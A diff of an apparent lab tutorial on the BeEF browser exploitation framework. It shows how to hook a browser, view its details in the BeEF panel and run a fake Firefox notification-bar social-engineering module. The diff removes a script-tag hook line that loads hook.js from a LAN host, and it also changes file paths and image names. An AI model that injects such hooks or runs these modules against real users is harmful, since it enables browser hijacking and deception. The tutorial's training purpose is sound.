@@ -78,10 +78,8 @@ So if you have an html page that you would like to embed into, feel free.
 However, we have already created a page which performs dynamic embedding of the BeEF hook.
 
 
-This page is located at: /var/www/html/beef/hook.php
-Just insert this line to it:
+This page is located at: /var/www/beef/hook.php
 
-`<script src='http://192.168.1.109:3000/hook.js'></script>`
 
 
 Open up a new Firefox instance by either running this command:
@@ -104,7 +102,7 @@ Now open up a new tab and navigate to the BeEF UI.  This can be accomplished by 
 directly accessing the url [http://127.0.0.1:3000/ui/panel](http://127.0.0.1:3000/ui/panel)
 or by visiting [http://127.0.0.1](http://127.0.0.1) and clicking the link **BeEF (Console)**.
 
-![](Beef_files/Image_003.png)
+![](Beef_files/Image_003.PNG)
 
 Authenticate:
 
@@ -114,7 +112,7 @@ Authenticate:
 After authentication you should be able to see your hooked browser on the left hand side 
 under "Online Browsers"
 
-![](Beef_files/Image_004.png)
+![](Beef_files/Image_004.PNG)
 
 And that's it, you have successfully hooked a web browser.
 
@@ -131,18 +129,18 @@ Assuming you already have a hooked web browser, let's take a look at some things
 Open the BeEF console by either navigating directly to [http://127.0.0.1/ui/panel](http://127.0.0.1/ui/panel)
 or visiting [http://127.0.0.1](http://127.0.0.1) and clicking the link **BeEF (Console)**.
 
-![](Beef_files/Image_004.png)
+![](Beef_files/Image_004.PNG)
 
 To get started click on your hooked web browser.  This should bring up details about your selected 
 browser in the multi-tabbed menu on the right of the console.
 
-![](Beef_files/Image_005.png)
+![](Beef_files/Image_005.PNG)
 
 These details can help you tailor attacks to your victim's browser.
 
 Let's run a few commands.  Select the commands tab.
 
-![](Beef_files/Image_006.png)
+![](Beef_files/Image_006.PNG)
 
 Now expand the module tree
 
@@ -152,7 +150,7 @@ Select `Social Engineering > Fake Notification Bar (Firefox)`
 
 This should open up a menu on the right.  Leave all the options default and click `Execute`
 
-![](Beef_files/Image_008.png)
+![](Beef_files/Image_008.PNG)
 
 After a few seconds, the hooked browser should see something similar to this.
 
